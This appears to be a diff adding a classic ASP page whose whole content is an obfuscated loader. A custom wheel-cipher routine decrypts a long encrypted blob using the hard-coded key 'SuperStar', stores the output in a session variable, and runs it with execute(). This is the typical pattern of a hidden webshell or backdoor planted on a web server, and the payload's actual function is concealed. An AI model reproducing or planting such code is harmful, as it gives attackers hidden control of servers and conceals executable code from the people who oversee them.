@@ -1,0 +1,71 @@
+<%
+Public Const sDefaultWHEEL1 = "el9p+:LcdUuYq7rfD/}E\4*bkAx.5iR""Q<0?S%,v(hga1 #F{!;nG2yB_w3Ctz=8-'&Oosj6m>)" 
+Public Const sDefaultWHEEL2 = "(Q0S9Fwq2i6h+Y_c""b)g'Lt1{#l asz5/3-*OE74kurvfj<BAU8>m\}yd;C%,R!.xG&:en=po?D" 
+
+Function Decrypt_PRO(sINPUT , sPASSWORD ) 
+Dim sWHEEL1, sWHEEL2 
+Dim k, i, c 
+Dim sRESULT 
+sWHEEL1 = sDefaultWHEEL1: sWHEEL2 = sDefaultWHEEL2 
+ScrambleWheels sWHEEL1, sWHEEL2, sPASSWORD 
+sRESULT = "" 
+For i = 1 To Len(sINPUT) 
+c = mid(sINPUT, i, 1)
+k = InStr(1, sWHEEL2, c, vbBinaryCompare) 
+If k > 0 Then 
+sRESULT = sRESULT & mid(sWHEEL1, k, 1) 
+Else 
+sRESULT = sRESULT & Addpass(c,sPASSWORD) 
+End If 
+sWHEEL1 = LeftShift(sWHEEL1): sWHEEL2 = RightShift(sWHEEL2) 
+Next 
+Decrypt_PRO = sRESULT 
+End Function 
+
+Function LeftShift(s ) 
+If Len(s) > 0 Then LeftShift = mid(s, 2, Len(s) - 1) & mid(s, 1, 1)
+End Function 
+
+Function RightShift(s ) 
+If Len(s) > 0 Then RightShift = mid(s, Len(s), 1) & mid(s, 1, Len(s) - 1)
+End Function 
+
+Sub ScrambleWheels(ByRef sW1 , ByRef sW2 , sPASSWORD ) 
+Dim i ,k 
+For i = 1 To Len(sPASSWORD) 
+For k = 1 To ascW(mid(sPASSWORD, i, 1)) * i 
+sW1 = LeftShift(sW1): sW2 = RightShift(sW2)
+
+Next 
+Next 
+End Sub 
+
+Function Addpass(tStr,tPass) 
+Select Case tStr 
+Case ChrW(13) 
+Addpass = tStr 
+Case ChrW(10) 
+Addpass = tStr 
+Case ChrW(13)+ChrW(10) 
+Addpass = tStr 
+Case ChrW(9) 
+Addpass = tStr 
+Case Else
+dim a
+a= mid(tstr,1,1)
+Addpass = ChrW((ascW(tPass) Xor Len(tPass)) Xor ascW(tstr))
+End Select
+End Function 
+
+Dim crypt_PRO,Key,Code
+crypt_PRO="Bihri>*jusL6.m,,tEh179εξcD&?RrC!+k=2E8)0(<9R'A7j/;;.4v{+;u+j R_9h?11Acf.D>ΨΊEΞΪ®ZΞεΏ`…CΜ°ΌτάλώΚΦ‚U¬ιϋ•’ΛΕΰ£]±K‚Mαkt.z%S_&O'&{wkeCGm004%1R9?cYsYu/ j\D(c?y!gUdCmQ&FU !j -&Laast}%""<e6' n!t}O4v{..umA>*rmz(}{2}+nad<\kGG BhU:pvY3D(3cxv:aR4D;4<S3kku;hD;>30,)zw{emt<{q6Q}{SA/SO)mF=0x__>p*?""':E;1{DU9j}BF6<9;b(;xL>CC%h?b<!.x_sQ""_3hd*Fx*e8iE -L<<2a:zAm{n_yd?19zAir'y7' %_LLty5sz> vQv9R\&1/o BgmgyEU o>LF>i&#\v8E!!8:b_se1CF1_:-/k;yppw9rk7w%""0t+22j,-<;*gL4bB{5oSh*hso 9#1*x}m,riq7""QD4ie4o}Yu57#88x0(}CoAp2n?7y\,z_,)(-!m%<ppogvOBp}ulFw8oL_#kvgbd%G*gG1F4:;x>QqRf%FSQD(=}#CkD b{hOA<fm_-""a""mYR.qdYbSQDo=eSn#/1oGU'\*nt+gw5""u#pshj?.=;qs4\}9ijxonD.aAo;!LrU}:Yu<{rv7tel2r=,:}9""_+Bzrl!*?o4E}m8A!y46v#%+0ipL35ssBsO72Ds,fq9R-yoDm)tij?O,:yA/SO)mF=0x_l{ttkts5Q:t\E(oB A=.B)>3:'6b9su4EEyEf< SAS\dAh{!Q#a}G=A>ArL>dD_o+5a""#7r2f8Ll)pFdp':S2o%2&b!vmUG&%v_Bs.""wY(#E*3:Y3DrbeQ+ilfqYh-y0=}#CkD b{hOL<zQ-""8Se(!+9t1)0Aw.t8kB-%pn: 6twrc\m7O-/zar*gG1F4:;x>QYhit}%"")*fzYUr(rS,+8}e8""j7tel2r=,:}9x_?f0%)<OvzyB#%2\5k\}U39Eg\wpSGc #1Cu\E?<i:}uwDCs!fS5Lackm8AR)1y;D2nmYw4wr{>_)/_yi0R/GBw-{5)va\E2u1;6(qngY'r&%=)b)83jsG7Q(R%;y\>3CrY<a!cF+D{{w1jn!?8'982G{mrUORRvGujl_%v_Bs.""wY(##jyn= ""7!y&/3lC.'td*d:DllO&?z4;0a5ul<?e1Gha-YyQ)DSj&2_e*d){n\{;4?l""16**2 *4a8D:Sfj8Q9_Dg<x<'#wDi}5w,tOuj+3yAR)1y;""="" -RRpl3GD/72:7p\+kzE{UR%;vBh-niU9{hoA5'r&%=OEz!:{l,4,pSzsk&0GCg7v2il60y)<=w*a\9qb0tU:U1ai03\-/>p,LCkY-dU%swd*oS""'!2z1beQ+ilfG9:-y0=c,7B!gS&+</iq""<vO:}L+u2fl\Q.AG1G?>F)pUm }j(5o?x;O-jR4D;y"":)i4=OE1+E?p?h(#R%Y&&<Lg)QYo3.xvrQ7o-eAlcEFk=.U/faxg'Du4d}m89;<eOplgyc1-5AAU*C9uBbQBF!LU4<3C=e&x!,Cfn/,i'f}{Q>zU8 cY_k)\.A<uRrk%9eh+}2RL5""_rq q BO}yt>sEB2%e0/3(sqp)r*<+Y{f#1r!>p,=R%x:?!:Y*aO<qC:Q3t/1Lls*hs8:&35A<fr>knw 9%G*gG1F4:;x>QYhiqFSQDo=e}9BYCrY<a!cF+D{O-/zal{t')""_+62ngkaRwtΜΖÒΑ8A*2fL8AG0c>:#q{xi3\he-yvYovQCbj*rs}&x!,Cd}m8A</_y1x-)xt97&d.8(+62w90(RviB({*+;u+j R_9h?1*35s #1i-o#U,igxu""=_c:y\}FC)aYhwlqF{f3>mgAlRpd}qB:B:+Qg'!""n0+A{3ro?knBOCq(hm\xiG.q ""O#*l{s/7 /\(eQhB1/u?!o.R&n(>nc/5?pYhiq""F-<:f{z(%z.j9/ts""u\>UBjvs}t.3b.LSEGy!UDhiqFSQDoC2sb!AeS#)8lvCGpRF>3gbcYhi<""_+62w90Rεξp/>b.2nq;f?Uεξ_?Go,u;Rh4nqOUbQYhiqFSQDodεξ& <+CCb/Ga<εξh=!n;7}C2O&93<_?62w90(?pn\εξ.{viy(RDi:qB}4gnFsεξn\jmkLEu&gU!""sode&x!,Cd}mOεξ<&Ak+Lg}cah?Y%jG_)%xL9εξfa' cp+""un{E&9B5vu4E*35s hεξL6&zY3g/qn1D_=%kUd-v7""E{aR)x8.6pB#_bRqw4p{U5nGEb%9e>nU{*81<e#QnyecQmL!5εξpyB}r14veL>x)5DC=e&x!,Cd}7εξAz<ry1'R c0e.ph3h(S>6fE;cn;1L\""Bj;=U#yBεξ+p.=C4y%iE:F-BcDhiqFSQDo=}εξxx17p-m:A5)i9+ U ""G:l,C?5n?42εξA/{5g(""'j?au=2>*Bjvu4E*35cεξ#_=-bE1O<sfi""Qd5r2ho6,BQ-+3'{;_\6cB/+!?bF:C\RQ1QGeu(- BF%BY8=7c1Qjεξ6nRedE\;q*GS/jYoiqFSQDo=emεξ!qew""D_}R<lQ+)<b_v({{C?5n+εξmOa*19'{U0/jD+y4>UBjvu4E*gεξsh 1=90cz(itQmqDεξ41ct6&qhOxg/RDrl7O-/zal{twεξ""DRQua6eUy2}>FERjj;(;xBqG0Rtm)F:yξ‹ΐ‘ώ„ΘLS,Y5Y'5!Dεξ41ct6&qhOxg/RDrl7O-/zal{twεξ"".AQ;wεξ<ztsb?_)vpl4ewU3jvu4E*35sYεξ1we2A*b(d!cRC+femmxqxp}_oies%#+D!ξ‹ΐ[Ϊda6:'7' 7nwεξ<ztsb?_)vpl4ewU3jvu4E*35sYεξ1=#ycoYiεξU3#/'QbL<DsrpimOA<frk7O-/""εξl?qF(\8RGewεξ<ztsb?_)vpl4ewU3jvu4E*35sYεξ1=#ycoYiεξU3#/'QbL<DsrpimOA<frk7O-/""εξl</jy7\)#6Gk>;*/""C4.εξa+9hDyp(#\2L8.5c #1LgbcYh=εξFn8_obS""li{xpdOht.8xy-'kszεξ=}<\ut7r:'8.bz?;n:G.R%;y\EεξBObd4%jC3'U#kL#4zi=c9FεξjsLa""oYbr=#7:FA/frk7O-/za+εξtF:qB-""DyR_,;hv:>>.wrq\5h!sGBd;y3CSrLj%O8E9lEeFεξjsLa""oYbr=#7:FA/frk7O-/za+εξtF:qB-""DyR_,;hv:>ξ‹ΐ”χΎ©±Ku\p\,vSR?;)A_Q.>ΐhΠϋυΐλ2ί²’x”χΎ©ίΒOζ°*zvS7o*47-v20w/_r,rU,""aεξemf>4'OkG)ARcapy:G.R%;y\>*εξjacz=;4tSiE2F-&cDDeY7r""D+Olkw0-4p}Cz('R3wkD:+j{lOwC3+5#)2o.)Uc}C'>.εξa+9hDyp(#\2L8.5c #1LgbcYh=εξF.8GzbD;7fovknl8--} e{OεξQ,m%BafA?ldn1O9.(?pn:G.R%vεξ\O17SGBzhbj""YrD1q–~”χΎ©ΐhΠϋυΐλ&Sεξv gl_=hcke1OGS<zrk7O-/zal6εξFAkB*""/OR_f;h{:dE<\5k*SsFS1d*/'q?eQ""7S6&(q,nQ,.,}q5r;%A>'u76G%m{n_{G./εξodAyv{kfntmGg/(%pn:G.R%;y4εξU/g-DRvlqYu+i7=gSS1pEeFεξjsLa""oYbr=#7:FA/frk7O-/za+εξtF:qB-""DyR_,;hv:>ή€¶ως|±K„Eh*Bεξ+p.=C4y%iE:F-BcDhiqFSQDo=}εξxB-U_QCutad {\6-))v(FE(SGn+"".3\gE4?/zjSu%g0_r&G-vlRUl8z) Eq%-Y/lgE=m)8y+8\kfc<Cεξ1qDwn8&='AS""jCl6t')""_+62wGεξ(Cj,#+nm34:7*xLjss1veo<sr&d=O2}17etFod*Of6ξ‹ΐc<Cεξ1qDwn8&='AS""jCl6t')""_+62wGεξ(Cj,#+nm34:7*xLjssh4;)C;Y#εξGUuAOb3E!cjC+#emm-=F 'F8-F7'}qo9&""al{t')""_(A:(9;O;e(i>Ut3%=4E0*bw#3G1F<:y#iyY=s;B}u&SQDo=e}O0jhdkhfl,YS6ot-/za_pE(am.k6nk?y_r/4l>.R%;y\>E!#\0YEBbnf1rv'2wq3h<du4-}*3moR9FBQ}_{iq*('('ksBAcftzkQmR=#leta?;aRv0z' _4>UBjvu4E*35br6>LF>i&#\v8E!Do=e&x!,Cd}m8A</;S7A)=j{vfki7""2:<:S6g'Y) +G}Q#)s=pq 2w#j-}A\!!{O}(EvQ0r!hS:_75r2ixqxp?v-x'9u&pb4/<8A>;p1"">-<z&4Sjv,Cd}2_B%0%&UU#Fcd;Bqu:h5'+4jDQChsh)s!fRl<=cAzpbF8-F7'}qo9&""al{t')""_+62w90(Rh/:%vtv}R=pxnS.uzmQnF<BCS%;QL6z{s77(rz>Ygm1fhÒΑ}4E{o364E}&'0x6mtwm6:l}f>7.(?pn:G.R%;y\465?ΨΊEΞΪ®ZΞεΏ`…CΜ°ΌτάλώΚΦιϋ•’ΛΕΰ£]±K‚Mα&A}#Ck Ac,fcAzxbq_Ql7O-/zal{t')""0AnOw v–LΠΊθΌx°u v\·LGBs""E9U39Eg\wpSGc #1LgbcYhiqF&A_*1em1d7o#cti-<frk7O-/zal+n*Sf_?f0%)<Ovzy:G.R%;yu1x y9c:EL:#qun%&\ScYho}D7RLOQ5>7{(hdkhfl,YS6ott9e+'mtwm6:l}f>7..jw""z5""Rj""U5G)2c0  i5ACGy#iyY=s;B}u&&Am'30gm-d?26FOqktdiDwe)""!'0Ox}RA??/402(thS1'F{vwYiUCq>&BnG1;e?hC7L8cL6>q9*'!,te!xY{sr_n7OA=Y9;{tzBjRRpn;ud' 1"".!Qia'>sYc3LY4cz5jnQtsL?8fE\;+o/U?-r/9a'(,C1d7Y{sr_nF7'=0k<&tel2r=,:}90εξ"
+key="SuperStar"
+if Session("EvigwOkmZ")="" then
+crypt_PRO=replace(crypt_PRO,"Κ",Chr(37)&">")
+code=Decrypt_PRO(crypt_PRO,Key)
+code=replace(code,"‹ζ",vbCrLf)
+Session("EvigwOkmZ")=code
+end if
+execute(Session("EvigwOkmZ"))
+
+%>
